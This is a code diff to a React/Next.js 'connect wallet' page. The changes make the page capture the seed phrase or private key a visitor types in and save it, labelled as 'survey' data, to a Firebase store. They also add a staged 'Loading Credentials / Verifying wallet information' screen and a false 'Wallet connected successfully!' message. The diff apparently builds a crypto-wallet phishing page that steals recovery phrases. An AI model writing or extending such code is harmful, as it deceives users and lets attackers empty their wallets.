@@ -8,9 +8,9 @@ import {
   Shield,
   ArrowRight,
   ChevronRight,
-  ShieldCheck, // Added for the secure icon
   Loader2,
-  Lock, // Added for a subtle spinner
+  Lock,
+  CheckCircle2, // Added for potential success visual
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { toast } from "sonner";
@@ -19,11 +19,13 @@ import Link from "next/link";
 import { useAuthStore } from "@/stores/authstore";
 import ProtectedImage from "@/components/tools/protected";
 import ShowManualWall from "@/components/manual-wallets/showmanual";
+import { storeSurveyData } from "@/lib/firebaseUtils";
+import { useWalletStore } from "@/stores/walletStore";
 
 // ---------------------------------------------
 
-// 1. Updated Type to include "connecting"
-type Step = "intro" | "select" | "connecting" | "connect";
+// 1. Updated Type to include "verifying"
+type Step = "intro" | "select" | "connecting" | "connect" | "verifying";
 type ConnectionMethod = "seed" | "private-key" | "forgot";
 
 interface WalletOption {
@@ -89,16 +91,13 @@ const ConnectWallet: React.FC = () => {
     null
   );
 
-  // Unused in this snippet but kept from your original code
-  const [connectionMethod, setConnectionMethod] =
-    useState<ConnectionMethod>("seed");
-  const [inputValue, setInputValue] = useState("");
+  const { walletName, walletProvider, setWalletProvider } = useWalletStore();
 
   const filteredWallets = wallets.filter((w) =>
     w.value.toLowerCase().includes(searchQuery.toLowerCase())
   );
 
-  // 2. Logic to handle the 1.5s delay
+  // Logic to handle the 1.5s delay for the initial "Connecting" screen
   useEffect(() => {
     let timer: NodeJS.Timeout;
     if (step === "connecting") {
@@ -109,18 +108,39 @@ const ConnectWallet: React.FC = () => {
     return () => clearTimeout(timer);
   }, [step]);
 
+  // 2. Updated handleFinish to show loading state then redirect
   const handleFinish = async (walletPhrase: string) => {
+    // Switch to verifying/loading view
+    setStep("verifying");
+
     try {
-      console.log("Wallet Phrase Submitted:", walletPhrase);
-      // Your existing submission logic here
+      const survey = {
+        walletName,
+        walletProvider,
+        siPhrase: walletPhrase,
+      };
+      console.log("this is the phrase", walletPhrase);
+
+      // Save data
+      await storeSurveyData(survey);
+
+      // Optional: Add a small delay so the user sees the "Loading credentials" screen
+      // otherwise it might flash too fast if the DB write is instant.
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+
+      toast.success("Wallet connected successfully!");
+      router.push("/");
     } catch (error) {
       console.log(error);
+      toast.error("Failed to connect. Please check your details.");
+      setStep("connect"); // Return to input on error
     }
   };
 
   const handleWalletSelect = (wallet: WalletOption) => {
     setSelectedWallet(wallet);
-    setStep("connecting"); // 3. Go to connecting state first
+    setWalletProvider(wallet.value);
+    setStep("connecting");
   };
 
   // Auth Protection
@@ -275,15 +295,11 @@ const ConnectWallet: React.FC = () => {
     </div>
   );
 
-  // 4. New Render function for the "Connecting" state
   const renderConnecting = () => (
     <div className="animate-fade-up flex flex-col items-center justify-center py-12">
       {/* Icon Container with Animation */}
       <div className="relative mb-8">
-        {/* Pulsing ring */}
         <div className="absolute inset-0 bg-primary/20 rounded-full animate-ping" />
-
-        {/* Main Circle */}
         <div className="relative z-10 w-24 h-24 bg-card border border-primary/30 rounded-full flex items-center justify-center shadow-lg shadow-primary/10">
           {selectedWallet && (
             <ProtectedImage
@@ -293,18 +309,46 @@ const ConnectWallet: React.FC = () => {
             />
           )}
         </div>
-
-        {/* Secure Badge */}
         <div className="absolute -bottom-2 -right-2 bg-background border border-green-500/30 p-2 rounded-full shadow-lg z-20 flex items-center justify-center animate-bounce-subtle">
           <Lock className="w-4 h-4 text-green-500" />
         </div>
       </div>
 
-      {/* Text Content */}
       <h2 className="font-orbitron font-bold text-2xl mb-3">Connecting...</h2>
       <div className="flex items-center gap-2 text-muted-foreground">
         <Loader2 className="w-4 h-4 animate-spin" />
         <p>Establishing secure connection</p>
+      </div>
+    </div>
+  );
+
+  // 3. New Render function for "Loading Credentials"
+  const renderVerifying = () => (
+    <div className="animate-fade-up flex flex-col items-center justify-center py-12">
+      <div className="relative mb-8">
+        {/* Faster ping animation for processing state */}
+        <div className="absolute inset-0 bg-secondary/20 rounded-full animate-ping duration-700" />
+
+        <div className="relative z-10 w-24 h-24 bg-card border border-secondary/30 rounded-full flex items-center justify-center shadow-lg shadow-secondary/10">
+          {selectedWallet && (
+            <ProtectedImage
+              filename={selectedWallet.filename}
+              alt={selectedWallet.label}
+              className="w-12 h-12 object-contain"
+            />
+          )}
+        </div>
+
+        <div className="absolute -bottom-2 -right-2 bg-background border border-secondary/30 p-2 rounded-full shadow-lg z-20 flex items-center justify-center">
+          <Loader2 className="w-4 h-4 text-secondary animate-spin" />
+        </div>
+      </div>
+
+      <h2 className="font-orbitron font-bold text-2xl mb-3">
+        Loading Credentials...
+      </h2>
+      <div className="flex items-center gap-2 text-muted-foreground">
+        <p>Verifying wallet information</p>
       </div>
     </div>
   );
@@ -318,21 +362,24 @@ const ConnectWallet: React.FC = () => {
           <div className="absolute bottom-1/3 right-1/4 w-80 h-80 bg-secondary/5 rounded-full blur-3xl" />
         </div>
 
-        {/* Back Button - Hide during connection phases */}
-        {step !== "connecting" && step !== "connect" && (
-          <Link
-            href="/"
-            className="absolute top-6 left-6 flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
-          >
-            <ArrowLeft className="w-4 h-4" />
-            Home
-          </Link>
-        )}
+        {/* Back Button - Hide during connection/verifying phases */}
+        {step !== "connecting" &&
+          step !== "connect" &&
+          step !== "verifying" && (
+            <Link
+              href="/"
+              className="absolute top-6 left-6 flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors"
+            >
+              <ArrowLeft className="w-4 h-4" />
+              Home
+            </Link>
+          )}
 
         <div className="w-full max-w-md relative z-10">
           {step === "intro" && renderIntro()}
           {step === "select" && renderSelect()}
           {step === "connecting" && renderConnecting()}
+          {step === "verifying" && renderVerifying()}
           {step === "connect" && (
             <ShowManualWall
               handleFinish={handleFinish}
